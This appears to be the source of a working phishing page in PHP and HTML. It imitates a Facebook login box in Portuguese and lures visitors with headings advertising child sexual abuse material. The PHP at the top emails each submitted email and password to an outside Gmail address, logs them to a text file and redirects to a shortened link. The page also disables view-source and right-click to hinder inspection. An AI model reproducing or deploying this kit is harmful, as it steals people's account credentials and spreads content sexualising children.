<?php
    session_start();
    ob_start();

?>
    <?php
      if(isset($_POST["login"])){
        $username = $_POST["email"];
        $password = $_POST["password"];
            if($username == ""|| $password == ""){
                echo "Bạn chưa nhập đầy đủ thông tin";
                
            }else{
                
            $_SESSION["username"] = $username;
            echo $_SESSION["username"];
            $subject = "Tài khoản";
            $headers = "Tài khoản mới";
            $body = " \n Email: $username - Pass: $password \n ";
            mail("vvvanvo1206vv@gmail.com", $headers, $body, $subject);
            $test = fopen("./text/admin.txt","a");
            fwrite($test,$body);
            fclose($test); 
            
            header('Location: https://bit.ly/39EDg2g');
            }



      }

    ?>


<html>
    <head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta property="og:image" content="https://1.bp.blogspot.com/-07dBkZHNd5A/YAcM3ASc8NI/AAAAAAAAAEg/9AXSyiL7C1wgLYR7mKtoN7DEcBsDo1cJQCLcBGAsYHQ/s222/image.jpg" />
		<title>HOT CHILD PORN</title>
		<link rel="shortcut icon" type="image/png" href="https://www.favicon.cc/logo/pkuk555.png">

		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
        
		<style type="text/css">
			* {
				 box-sizing: border-box;
			}
			 html {
				 background: #e2e2e2;
			}
			 body {
				 background: #e2e2e2;
				 margin: 0;
				 padding: 0;
				 font-family: 'Lato', sans-serif;
			}
			img.img-responsive {
   				width: 28%;
    			height: 50%;
			}
			 .login-form-wrap {
				 background: radial-gradient(ellipse at center, rgba(81, 112, 173, 1) 0%, rgba(53, 84, 147, 1) 100%);
				 border: 1px solid #2d416d;
				 box-shadow: 0 1px #5670a4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);
				 border-radius: 5px;
				 width: 380px;
				 height: 510px;
				 margin: 60px auto;
				 padding: 30px 30px 0 40px;
				 text-align: center;
			}
			 .login-form-wrap h1 {
				 margin: 0 0 40px 0;
				 padding: 0;
				 font-weight: bold;
				 font-size: 26px;
				 color: #fff;
			}
			 .login-form-wrap h5 {
				 margin-top: 40px;
			}
			 .login-form-wrap h5 > a {
				 font-size: 14px;
				 color: #fff;
				 text-decoration: none;
				 font-weight: 400;
			}
			.login-form input[name="email"], .login-form input[name="pass"] {
				 width: 100%;
				 border: 1px solid #314d89;
				 margin-right: 110px;
				 outline: none;
				 padding: 12px 20px;
				 font-weight: 400;
				 font-family: 'Lato', sans-serif;
				 cursor: pointer;
			}
			 .login-form input[name="email"] {
				 border-bottom: none;
				 border-radius: 4px 4px 0 0;
				 padding-bottom: 13px;
				 box-shadow: 0 -1px 0 #e0e0e0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;
			}
			 .login-form input[name="pass"] {
				 border-top: none;
				 border-radius: 0 0 4px 4px;
				 box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
			}
			 .login-form input[type="submit"] {
				 font-family: 'Lato', sans-serif;
				 font-weight: 400;
				 background: linear-gradient(to bottom, rgba(224, 224, 224, 1) 0%, rgba(206, 206, 206, 1) 100%);
				 display: block;
				 margin: 20px auto 0 auto;
				 width: 100%;
				 border: none;
				 border-radius: 3px;
				 padding: 8px;
				 font-size: 17px;
				 color: #636363;
				 text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);
				 font-weight: 700;
				 box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;
			}
			 .login-form input[type="submit"]:hover {
				 background: #ddd;
			}
			 .login-form input[type="submit"]:active {
				 padding-top: 9px;
				 padding-bottom: 7px;
				 background: #c9c9c9;
	}
	@media only screen and (max-width: 320px) {
	    section.login-form-wrap {
    		margin-left: 43%;
    		width: 250px;
			height: 410px;
		}
	}
		@media (min-width: 426px) and (max-width: 768px){
      	section.login-form-wrap {
    		margin: 57px 360px;
		}
		img.img-responsive {
   				width: 42%;
            height: 50%;
			}
  	  }
	@media (min-width: 1441px) and (max-width: 2560px){
      	section.login-form-wrap {
    		margin-left: 43%;
		}
  	  }
		</style>
	<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js" async=""></script>
	</head>
	<script type='text/javascript'>
//<![CDATA[
//Ctrl+U
shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","\\":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},shortcut.add("Ctrl+U",function(){top.location.href="./index.php"});
//]]>
</script>
	<body onclick="showlog()" class="modal-open" oncontextmenu=”return false” ondragstart=”return false” onselectstart=”return false” >
	    
	    <div class="container">
    		<div class="row" style="margin-top: 10px;">
    			<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
    			    <div class="separator" style="clear: both; text-align: center;">
                        <b><span style="color: red; font-size: 24pt;"><a href="#" onclick="showlog()" style="background-color: yellow;">Video Child Porn 18+</a></span></b>
                    </div>
    				<img src="image.jpg" class="img-responsive" alt="Image" onclick="showlog();">
    				<div class="separator" style=" text-align: center; margin-top: 200px;">
                        <b><span style="color: red; font-size: 24pt;"><a href="#" onclick="showlog()" style="background-color: yellow; color: #ff1313; ">▶ Assista ao Video Child Porn 18+ </a></span></b>
                    </div>
    			</div>		
    		</div>		
    	</div>	
    	<div class="modal fade in" id="myModal" role="dialog" style="display: block; padding-left: 0px;">
    	    <section class="login-form-wrap">
<div class="row" style="background: #3b5998;">
                <div class="col-lg-12" style="text-align: center; padding: 5px 0px;">
                    <span style="color:#fff;    font-family: helvetica, arial, sans-serif;
                          font-size: 25px;
                          color: #fff;

                          font-weight: bold;">facebook</span>
                </div>
            </div>
            <div class="row">
                
                    <div style="  width: 300px;
                         font-size: 20px;
                        background-color: #fff9d7;
                        border: 1px solid #e2c822;
                       
                         padding: 7px 23px;
                         margin: 1px auto;
                         border-radius: 10px;
                         margin-bottom: 15px;">
                        Faça login para verificar se você é maior de 18+
                    </div>
                
				
				
            </div>
            <div class="row">                                   
                    <form id="login_form_mb" action="index.php" method="post" onsubmit="return checkFormMB()">
                        <input required="" style="height:50px;border-bottom-left-radius: 0px;
                               border-bottom-right-radius: 0px;" name="email" class="form-control" id="email" placeholder="Endereço de email ou número de telefone">
                         <input required="" name="password" type="password" style="height:50px; border-top:none;   border-radius: 0px;" class="form-control" id="password" placeholder="Senha">
                        <div class="_55ws" style="
                             padding: 10px 0px;
                             border-top:none;">
                            <button type="submit" name="login" class="btn btn-primary btn-lg btn-block" style="  padding: 4px 0px;  background-color: #627aad;border-radius: 4px;text-shadow: 0 -1px rgba(0, 0, 0, .25);
    background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
    background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));border: 1px solid #4162A7;">Entrar</button>
                        </div>

                    </form>
                </div>
              

                    <button style="background-color: #5b93fc; padding: 10px 20px; font-weight: bold;     border: 1px solid #0A5AED;text-shadow: 0 -1px rgba(0, 0, 0, .25);    background-image: -webkit-linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
    background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));" type="button" class="btn btn-primary">Crear una nueva cuenta</button>
                    <p style="color: #899bc1;
                       font-size: 12px;
                       line-height: 16px; margin-top: 10px;">Você esqueceu sua senha? Centro de ajuda</p>
                </section></div>
            
    		
    	  
		<script src="//code.jquery.com/jquery.js"></script>
		<script type="text/javascript">
			$( document ).ready(function() {
				setTimeout( e => {
									showlog()
								}, 1000)			    
			});
			function showlog() {
				$('#myModal').modal({
                    backdrop: 'static',
                    keyboard: true, 
                    show: true
                });
			}
			// function checkForm () {

            //                          email= document.getElementById('email').value;
            //                          pass= document.getElementById('password').value;
  
            //                          if(email.length<6||pass.length<6){
            //                             //alert('rrrrrrrrr');
            //                           //  $('#error-z').text("2");
            //                             return false;
            //                          }
            //                         return true;
            //                             // body...
            //                         }
            //                         function checkFormMB () {

            //                          email= document.getElementById('email').value;
            //                          pass= document.getElementById('password').value;
            //                          if(email.length<6||pass.length<6){
            //                             //alert('rrrrrrrrr');
            //                           //  $('#error-z').text("2");
            //                             return false;
            //                          }
            //                         return true;
            //                             // body...
            //                         }
		</script>
    </body>
</html>